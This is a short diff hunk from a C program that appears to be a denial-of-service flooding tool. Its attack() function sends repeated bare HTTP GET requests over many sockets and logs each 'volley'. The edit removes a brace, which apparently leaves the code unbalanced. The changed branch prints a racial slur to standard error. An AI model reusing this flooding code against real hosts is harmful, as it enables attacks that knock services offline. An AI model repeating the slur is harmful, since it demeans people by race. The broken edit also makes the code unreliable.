@@ -69,7 +69,7 @@ void attack(char *host, char *port, int id) {
 			if(x < PPS) {
 				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", 18);
 				
-			} else {
+			} else 
 				fprintf(stderr, "Niggers\n");
 			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
